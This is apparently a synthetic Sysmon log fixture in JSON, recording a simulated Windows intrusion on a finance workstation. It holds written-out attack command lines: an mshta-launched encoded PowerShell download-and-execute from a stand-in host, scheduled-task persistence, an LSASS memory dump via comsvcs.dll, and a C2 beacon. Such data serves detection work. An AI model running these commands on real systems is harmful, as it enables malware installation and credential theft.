@@ -1,0 +1,113 @@
+[
+  {
+    "Timestamp": "2026-10-15T14:19:02Z",
+    "Host": "WKSTN-FIN-09",
+    "User": "CORP\\j.miller",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "EventID": 1,
+    "ProcessId": 4120,
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer",
+    "SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+  },
+  {
+    "Timestamp": "2026-10-15T14:21:11Z",
+    "Host": "WKSTN-FIN-09",
+    "User": "CORP\\j.miller",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "EventID": 1,
+    "ProcessId": 5892,
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -NoP -W Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdocHRwOi8vMTk4LjUxLjEwMC40Mi9pbml0LnBzMScp\"\", 0 : window.close\")",
+    "SHA256": "5a9b8e1102a7f34e2a89f0123d45c6789abcdef0123456789abcdef012345678"
+  },
+  {
+    "Timestamp": "2026-10-15T14:21:12Z",
+    "Host": "WKSTN-FIN-09",
+    "User": "CORP\\j.miller",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "EventID": 1,
+    "ProcessId": 6044,
+    "ParentImage": "C:\\Windows\\System32\\mshta.exe",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoP -W Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdocHRwOi8vMTk4LjUxLjEwMC40Mi9pbml0LnBzMScp",
+    "SHA256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+  },
+  {
+    "Timestamp": "2026-10-15T14:21:14Z",
+    "Host": "WKSTN-FIN-09",
+    "User": "CORP\\j.miller",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "EventID": 3,
+    "ProcessId": 6044,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "DestinationIp": "198.51.100.42",
+    "DestinationPort": 80,
+    "DestinationHostname": "verify-human-check.example",
+    "Protocol": "tcp"
+  },
+  {
+    "Timestamp": "2026-10-15T14:21:18Z",
+    "Host": "WKSTN-FIN-09",
+    "User": "CORP\\j.miller",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "EventID": 11,
+    "ProcessId": 6044,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "TargetFilename": "C:\\Users\\j.miller\\AppData\\Local\\Temp\\sync_helper.exe",
+    "SHA256": "8b1a9953c4611296a827abf8c47804d7e6c49c6b104372185c52b912a9881b21"
+  },
+  {
+    "Timestamp": "2026-10-15T14:21:20Z",
+    "Host": "WKSTN-FIN-09",
+    "User": "NT AUTHORITY\\SYSTEM",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "EventID": 1,
+    "ProcessId": 3104,
+    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+    "Image": "C:\\Windows\\System32\\backgroundTaskHost.exe",
+    "CommandLine": "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:BackgroundTaskHost.WebAccountProvider",
+    "SHA256": "11223344556677889900aabbccddeeff0011223344556677889900aabbccddee"
+  },
+  {
+    "Timestamp": "2026-10-15T14:21:25Z",
+    "Host": "WKSTN-FIN-09",
+    "User": "CORP\\j.miller",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "EventID": 1,
+    "ProcessId": 6412,
+    "ParentImage": "C:\\Users\\j.miller\\AppData\\Local\\Temp\\sync_helper.exe",
+    "Image": "C:\\Windows\\System32\\schtasks.exe",
+    "CommandLine": "schtasks.exe /Create /SC MINUTE /MO 30 /TN \"EdgeUpdateSync\" /TR \"C:\\Users\\j.miller\\AppData\\Local\\Temp\\sync_helper.exe\" /F",
+    "SHA256": "4c8f2b1e9a0d3c5b7e6f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d"
+  },
+  {
+    "Timestamp": "2026-10-15T14:21:31Z",
+    "Host": "WKSTN-FIN-09",
+    "User": "CORP\\j.miller",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "EventID": 10,
+    "ProcessId": 6620,
+    "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1fffff",
+    "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 684 C:\\Users\\j.miller\\AppData\\Local\\Temp\\debug_crash.dmp full",
+    "SHA256": "8b1a9953c4611296a827abf8c47804d7e6c49c6b104372185c52b912a9881b21"
+  },
+  {
+    "Timestamp": "2026-10-15T14:21:44Z",
+    "Host": "WKSTN-FIN-09",
+    "User": "CORP\\j.miller",
+    "Channel": "Microsoft-Windows-Sysmon/Operational",
+    "EventID": 3,
+    "ProcessId": 6388,
+    "Image": "C:\\Users\\j.miller\\AppData\\Local\\Temp\\sync_helper.exe",
+    "DestinationIp": "203.0.113.88",
+    "DestinationPort": 8443,
+    "DestinationHostname": "cdn-telemetry-sync.example",
+    "Protocol": "tcp",
+    "SHA256": "8b1a9953c4611296a827abf8c47804d7e6c49c6b104372185c52b912a9881b21"
+  }
+]
